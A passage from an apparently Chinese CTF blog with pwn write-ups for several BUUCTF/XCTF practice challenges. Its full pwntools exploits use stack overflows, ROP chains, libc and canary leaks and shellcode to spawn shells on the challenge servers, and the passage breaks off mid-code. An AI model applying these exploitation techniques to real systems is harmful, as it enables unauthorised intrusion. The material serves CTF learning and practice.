class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26981&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline()<br>ret = <span class="hljs-number">0x4004c9</span><br>shellcode = asm(shellcraft.sh())<br>p.sendline(shellcode)<br>p.recvline()<br>p.recvline()<br>name_addr = <span class="hljs-number">0x601080</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + p64(ret) + p64(name_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>我远程没打通，按理应该是可以的。可能是题的问题，注意要把<code>context.arch</code>改为和程序一样的。看下程序<code>checksec &lt;file_name&gt;</code>架构是<code>amd64-64-little</code>的。</p><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><del>32位程序，静态链接。先用<code>checksec</code>查看一下文件保护情况，只开启了<code>NX</code>，无法用<code>shellcode</code>，但是<code>ROP</code>是可以的，并且<code>IDA</code>反编译之后有<code>gets</code>，而且是静态链接，甚至不用<code>libc</code>，一眼简单题，开始尝试。</del></p><p><del>没有<code>system</code>，没有<code>/bin/sh</code>，好像不好搞shell，但是发现字符串里面有<code>flag.txt</code>，调用个链<code>open -&gt; read -&gt; write</code>?程序里正好有这三个函数，目前思路是这样，尝试下。</del></p><p>太粗心了，没看到有后门函数，那就不用构造<code>orw</code>了，但按理也行应该（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>Local = <span class="hljs-literal">True</span><br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29895&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p.recvline()</span><br>get_secret = <span class="hljs-number">0x080489A0</span><br>write = <span class="hljs-number">0x0806e270</span><br>bss_addr = <span class="hljs-number">0x080ECA2D</span><br>gdb.attach(p)<br><span class="hljs-comment">#-----open(&#x27;flag.txt&#x27;)-----#</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x2d</span> + p32(get_secret) + p32(write) + p32(bss_addr) + p32(<span class="hljs-number">1</span>) + p32(bss_addr) + p32(<span class="hljs-number">0x50</span>)<br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>64位，动态链接程序<br>保护情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">spongebob@spongebob:~/Document/pwn$ checksec pwn<br>[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>开启了栈执行保护，先不考虑bss</p><p>动态链接调<code>system(&#39;/bin/sh&#39;)</code>试试吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27536&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline(<span class="hljs-string">b&quot;Input your choice!&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>encrypt = <span class="hljs-number">0x4009A0</span><br>pop_rdi_ret = <span class="hljs-number">0x400c83</span><br><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input your Plaintext to be encrypted&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(encrypt)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>p.recvline()<br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gets_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(gets_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------step-2---------#</span><br><br>libc_addr = puts_addr - <span class="hljs-number">0x809c0</span><br>system = libc_addr + <span class="hljs-number">0x4f440</span><br>bin_sh = libc_addr + <span class="hljs-number">0x1b3e9a</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x57</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>这里做的时候一直在取地址的时候出现问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;Ciphertext\n&quot;</span>)<br>p.recvline()                 <span class="hljs-comment"># 加了这一句才解决</span><br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gets_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(gets_addr)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>原因是，覆盖返回地址覆盖的是<code>puts(s)</code>的返回地址，<code>puts(s)</code>本身是会有东西输出了，所以要多收一行。</p><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>32位置，动态链接<br>保护情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>无法用<code>bss</code>直接写了，我在这个题没找到栈溢出的地方（（（<br>不过有<code>system</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:28162&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = <span class="hljs-number">0x080482ea</span><br>passwd = <span class="hljs-string">b&quot;administrator&quot;</span><br>p.recvuntil(<span class="hljs-string">b&quot;password:&quot;</span>)<br>p.sendline(passwd)<br>p.recvuntil(<span class="hljs-string">b&quot;0.Exit&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Please input new log info:&quot;</span>)<br>payload = <span class="hljs-number">0x4c</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sh)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>具体利用原理在于：<br><img src="/images/20250818120003.png"><br>这里src只有48字节大小，但是在<code>AddLog</code>里面可以输入128字节，可以构造栈溢出，然后在<code>GetFlag</code>里面利用。因为<code>GetFlag</code>里面会返回可控的地址。</p><h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>简单的ROP，泄露<code>libc</code>就可以了。</p><h1 id="pwn1-xctf"><a href="#pwn1-xctf" class="headerlink" title="pwn1(xctf)"></a>pwn1(xctf)</h1><p>64位动态链接，有Canary保护（第一次接触Canary保护的题目）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>先换一下动态链接器和共享库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --replace-needed libc.so.6 /home/spongebob/Document/pwn/libc-2.23.so pwn<br><br>patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so pwn<br></code></pre></td></tr></table></figure><p><code>puts</code>遇到回车不会停，遇到<code>\x00</code>才会停，因此可以覆盖掉<code>canary</code>的最低位，然后打印出整个<code>canary</code>并且补全就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><span class="hljs-comment"># context.log_level=&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;61.147.171.105:60635&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br>    <br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x400a93</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x400908</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment">#-------泄漏canary-------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># canary = u64(p.recv(7).strip().rjust(8, b&#x27;x\x00&#x27;))</span><br>canary = p.recv(<span class="hljs-number">7</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + canary<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment">#-------泄漏libc--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_addr = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_addr + <span class="hljs-number">0x18c177</span><br>one_gadget = libc_addr + <span class="hljs-number">0x45216</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;binsh_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------泄露新的canary--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># canary = u64(p.recv(7).strip().rjust(8, b&#x27;x\x00&#x27;))</span><br>canary = p.recv(<span class="hljs-number">7</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + canary<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#--------ROP获得shell--------#</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x8</span> + p64(one_gadget)<br>p.sendline(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>我的<code>exp</code>里泄露了两次<code>canary</code>，我以为重新返回<code>main</code>后canary会更新。这个是我从<code>canary</code>的原理是自己理解的。但实际上从汇编调用可以知道，返回<code>main</code>后仍然将<code>var_8</code>和<code>fs+0x28</code>进行比较，<code>var_8</code>在这个过程并没有发生改变。</p><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>64位动态链接程序，先用IDA看，发现有整数溢出的问题，然后应该就是简单ROP了</p><p><img src="/images/20250819164230.png"></p><p>整数溢出用-1来绕过，因为后面转成了<code>unsigned int</code>，所以可以<code>read</code>很多字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26320&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name:\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>back_door = <span class="hljs-number">0x400726</span> <br>p.recvuntil(<span class="hljs-string">b&#x27;name?\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(back_door)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>32位动态链接程序。</p><p>checksec了一下，十分感动，做了一周终于见到有<code>stack cananry</code>的题目了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>放到<code>IDA</code>里看一下<br><img src="/images/20250819170420.png"><br>往<code>buf</code>里面输入内容，然后输出输入的内容，并且输出x，x是已经给定的值，那就<code>read</code>来ROP劫持到<code>if</code>块内部吧，先搞定<code>canary</code><img src="/images/20250819170734.png"><br>可以看到canary在<code>buf + 0x50</code>的位置，选择将最低位<code>\x00</code>覆盖以全部打印的方式，从而泄露<code>canary</code>，<del>然后再重新劫持即可。</del><br>不对，这里发现一个问题，程序只会走一遍。如果不覆盖canary没法再次读从而进行ROP劫持了，并且<code>read(0, buf, 0x50</code>，长度不够，是不允许ROP的。但是是<code>printf</code>，考虑格式化字符串吧，但是没学过，现学一下（笑）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 